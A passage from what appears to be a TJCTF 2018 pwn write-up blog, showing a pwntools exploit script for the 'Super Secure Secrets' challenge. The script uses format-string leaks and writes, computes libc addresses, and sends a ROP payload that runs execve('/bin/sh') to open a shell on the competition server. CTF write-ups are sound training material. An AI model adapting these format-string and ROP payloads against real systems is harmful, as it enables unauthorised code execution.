<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p&#x3D;remote(&quot;problem1.tjctf.org&quot;,8009)</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">payload1&#x3D;p64(0x000400DA1)*15</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;s&quot;)</span><br><span class="line">p.recvuntil(&quot;Password:\n&quot;)</span><br><span class="line">p.sendline(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">p.recvuntil(&quot;Message:\n&quot;)</span><br><span class="line">p.sendline(&quot;%17$16llx%20$16llx%20$hhn&quot;)</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;v&quot;)</span><br><span class="line">p.recvuntil(&quot;Password:\n&quot;)</span><br><span class="line">p.sendline(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">p.recvuntil(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;)</span><br><span class="line">key&#x3D;p.recvuntil(&quot;\n&quot;)</span><br><span class="line">fgets_AD_addr&#x3D;int(key[0:17],16)</span><br><span class="line">fgets_addr&#x3D;fgets_AD_addr-0xad</span><br><span class="line">execve_addr&#x3D;fgets_addr-0x7eb20+0x0000000010a38c</span><br><span class="line">ebp_addr&#x3D;int(key[17:33],16)</span><br><span class="line">ebp_new&#x3D;(ebp_addr&amp;0xffffffffffffff00)+0x20+0x10</span><br><span class="line">bin_sh_addr&#x3D;ebp_addr-0x130</span><br><span class="line">pop_edi_ret&#x3D;0x0000000000400f93 </span><br><span class="line">p.recvuntil(&quot;Captcha: &quot;)</span><br><span class="line">ch&#x3D;p.recv()[:6]</span><br><span class="line">p.sendline(ch)</span><br><span class="line">payload&#x3D;p64(bin_sh_addr)+p64(execve_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&quot;s&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">retn_addr&#x3D;ebp_new-0x138</span><br><span class="line">hex(retn_addr)</span><br><span class="line">payload3&#x3D;&quot;%3987c%28$hn%41c&quot;+p64(retn_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;v&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;Captcha: &quot;)</span><br><span class="line">ch&#x3D;p.recv()[:6]</span><br><span class="line">p.sendline(ch)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Validator"><span class="toc-number">1.</span> <span class="toc-text">0x01 Validator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-Python-Reversing"><span class="toc-number">2.</span> <span class="toc-text">0x02 Python Reversing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Bad-Cipher"><span class="toc-number">3.</span> <span class="toc-text">0x03 Bad Cipher</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-Bricked-Binary"><span class="toc-number">4.</span> <span class="toc-text">0x04 Bricked Binary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-Math-Whiz"><span class="toc-number">5.</span> <span class="toc-text">0x05 Math Whiz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-Tilted-Troop"><span class="toc-number">6.</span> <span class="toc-text">0x06 Tilted Troop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-Future-Canary-Lab"><span class="toc-number">7.</span> <span class="toc-text">0x07 Future Canary Lab</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-Online-Banking"><span class="toc-number">8.</span> <span class="toc-text">0x08 Online Banking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-Secure-Secrets"><span class="toc-number">9.</span> <span class="toc-text">0x09 Secure Secrets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0A-Super-Secure-Secrets"><span class="toc-number">10.</span> <span class="toc-text">0x0A Super Secure Secrets</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#复用get-message"><span class="toc-number">10.1.</span> <span class="toc-text">复用get_message</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP"><span class="toc-number">10.2.</span> <span class="toc-text">ROP</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&text=TJCTF2018_Re&amp;&amp;PWN" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&title=TJCTF2018_Re&amp;&amp;PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&is_video=false&description=TJCTF2018_Re&amp;&amp;PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=TJCTF2018_Re&amp;&amp;PWN&body=Check out this article: http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&title=TJCTF2018_Re&amp;&amp;PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&title=TJCTF2018_Re&amp;&amp;PWN" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&title=TJCTF2018_Re&amp;&amp;PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&title=TJCTF2018_Re&amp;&amp;PWN" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&name=TJCTF2018_Re&amp;&amp;PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


